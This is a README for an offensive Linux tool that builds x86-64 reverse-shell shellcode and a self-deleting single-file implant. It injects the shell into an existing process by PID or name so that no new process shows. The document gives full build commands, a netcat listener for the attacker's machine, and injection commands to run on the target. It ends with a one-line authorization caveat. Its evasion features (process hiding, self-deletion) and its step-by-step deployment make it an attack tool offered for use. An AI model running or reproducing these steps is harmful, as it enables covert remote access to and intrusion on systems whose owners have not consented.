# linux-memexec — in-memory Linux reverse shell

Runs a reverse-shell payload inside an already-running process, so no new
process appears in the list. The single-binary implant self-deletes and falls
back to an in-place shell when injection is blocked.

## Make

```sh
./build.sh                                          # → memexec (run/inject shellcode)
python3 shellcode.py <IP> <PORT> <NAME> -o sc.bin   # → x86-64 shellcode bytes
python3 make_shell.py <IP> <PORT> <NAME> -o shell   # → single self-deleting implant
```

Requires nasm + gcc.

## Run

```sh
# your box
nc -lvnp <PORT>

# on the target
./memexec sc.bin                           # in place: memexec becomes the shell
./memexec sc.bin --pid <PID>               # inject into an existing PID — no new process
./memexec sc.bin --name <proc>             # inject by process name
./shell                                    # auto-hosts, self-deletes, one file
./shell --name <proc>                      # force a specific host process
```

Use only on systems and CTF targets where you have authorization.
